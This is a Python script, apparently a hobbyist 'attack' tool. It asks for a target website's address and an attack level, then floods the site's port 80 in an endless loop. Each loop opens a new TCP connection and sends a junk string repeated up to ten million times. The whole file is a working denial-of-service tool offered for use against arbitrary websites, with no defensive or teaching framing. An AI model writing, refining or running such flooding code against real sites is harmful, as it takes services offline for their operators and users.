import os
import socket
def vv():
    os.system("clear")
    print("\033[1;31m    _   _   _             _     \033[1;34m ____  _             _   ")
    print("\033[1;31m   / \ | |_| |_ __ _  ___| | __ \033[1;34m/ ___|| |_ __ _ _ __| |_ ")
    print("\033[1;31m  / _ \| __| __/ _` |/ __| |/ / \033[1;34m\___ \| __/ _` | '__| __|")
    print("\033[1;31m / ___ \ |_| || (_| | (__|   <  \033[1;34m ___) | || (_| | |  | |_ ")
    print("\033[1;31m/_/   \_\__|\__\__,_|\___|_|\_\ \033[1;34m|____/ \__\__,_|_|   \__|")
    print("")


os.system("clear")
print("\033[1;35m  ____      _              \033[1;34m                   _     __   _  _  ____  ")
print("\033[1;35m / ___|   _| |__   ___ _ __\033[1;34m _ __  _   _ _ __ | | __/ /_ | || || ___| ")
print("\033[1;35m| |  | | | | '_ \ / _ \ '__\033[1;34m| '_ \| | | | '_ \| |/ / '_ \| || ||___ \ ")
print("\033[1;35m| |__| |_| | |_) |  __/ |  \033[1;34m| |_) | |_| | | | |   <| (_) |__   _|__) |")
print("\033[1;35m \____\__, |_.__/ \___|_|  \033[1;34m| .__/ \__,_|_| |_|_|\_\\___/   |_||____/ ")
print("\033[1;35m      |___/                \033[1;34m|_|                                       ")
try:
    ip= input("\033[1;33mEntrer Target of Website: \033[1;36m")
    host=socket.gethostbyname(ip)
    print("1- Low")
    print("2- Midium")
    print("3- High")
    attack=int (input("Chouse An Attack Force: "))
except:
    print("Set Website not find chek the website")
####################################
def low():
    vv()

    while True:
        sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(900)
        conn  = sock.connect((host,80))
        data= ("fgbtrhkjljkfghbjthtehkrejhkthjerkjhjethkljetjhthjrhgjregjerz,nghjkhjkghjerghzrgjgkrgj6te5g454gter4gre56g4reg64rt56g4y65h44thyuj4uyk564uil4ou4ml5oil45jg4qf554rq4g554r6g4g46rre64gtre4g5rg6r4g65regerqg66r4ggrjrlkhrjhkjatejhjrjkahhajkhjkhkjhejkjkjkhrrjhgtejuguireyhgttueruteghuitg"*10000 ).encode("utf-8")
        sock.send(data)
        print("\033[1;31mattack \033[1;32mstart \033[1;34mfor \033[1;36mip ",host,"\033[1;32mport \033[1;36m80")
def midium():
    vv()

    while True:
        sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(9000)
        conn  = sock.connect((host,80))
        data= ("fgbtrhkjljkfghbjthtehkrejhkthjerkjhjethkljetjhthjrhgjregjerz,nghjkhjkghjerghzrgjgkrgj6te5g454gter4gre56g4reg64rt56g4y65h44thyuj4uyk564uil4ou4ml5oil45jg4qf554rq4g554r6g4g46rre64gtre4g5rg6r4g65regerqg66r4ggrjrlkhrjhkjatejhjrjkahhajkhjkhkjhejkjkjkhrrjhgtejuguireyhgttueruteghuitg"*100000 ).encode("utf-8")
        sock.send(data)
        print("\033[1;31mattack \033[1;32mstart \033[1;34mfor \033[1;36mip ",host,"\033[1;32mport \033[1;36m80")
def high():
    vv()

    while True:
        sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(90000)
        conn  = sock.connect((host,80))
        data= ("fgbtrhkjljkfghbjthtehkrejhkthjerkjhjethkljetjhthjrhgjregjerz,nghjkhjkghjerghzrgjgkrgj6te5g454gter4gre56g4reg64rt56g4y65h44thyuj4uyk564uil4ou4ml5oil45jg4qf554rq4g554r6g4g46rre64gtre4g5rg6r4g65regerqg66r4ggrjrlkhrjhkjatejhjrjkahhajkhjkhkjhejkjkjkhrrjhgtejuguireyhgttueruteghuitg"*10000000 ).encode("utf-8")
        sock.send(data)
        print("\033[1;31mattack \033[1;32mstart \033[1;34mfor \033[1;36mip ",host,"\033[1;32mport \033[1;36m80")
#####################################
try:
    if attack == 1:
        low()
    elif attack == 2:
        midium()
    elif attack == 3:
        high()
except KeyboardInterrupt:
    print(" Good Bay..!")
except:
    print("Or Your  connection..?")
